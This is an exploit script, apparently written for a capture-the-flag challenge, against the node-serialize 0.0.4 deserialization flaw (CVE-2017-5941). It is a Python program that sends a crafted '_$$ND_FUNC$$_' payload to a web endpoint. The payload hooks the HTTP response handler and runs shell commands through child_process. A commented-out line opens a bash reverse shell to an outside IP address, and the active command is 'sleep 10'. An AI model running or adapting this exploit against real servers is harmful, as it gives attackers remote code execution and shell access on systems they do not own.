# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (2)
# Exploit Author: UndeadLarva
# Software Link: https://www.npmjs.com/package/node-serialize
# Version: 0.0.4
# CVE: CVE-2017-5941

import base64
import re
import sys

import requests

url = 'http://son2yam.sibersiaga2023.myctf.io/json2yaml'  # change this

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
           "return function () {"
           "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
           "console.log('still inside');"
           "const { exec } = require('child_process');"
           # "exec('bash -i >& /dev/tcp/13.229.3.203/13136 0>&1');"  # change this
           "exec('sleep 10');"  # change this
           "}"
           "})(require('http').ServerResponse.prototype.end)")

# rce = "_$$ND_FUNC$$_process.exit(0)"
# code ="_$$ND_FUNC$$_console.log('behind you')"
code = "_$$ND_FUNC$$_" + payload
print(code)

string = '{"username":"TheUndead","country":"worldwide","city":"Tyr", "exec": "' + code + '"}'

data = {'data': string}

try:
    response = requests.post(url, data=data).text
    print(response)
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)
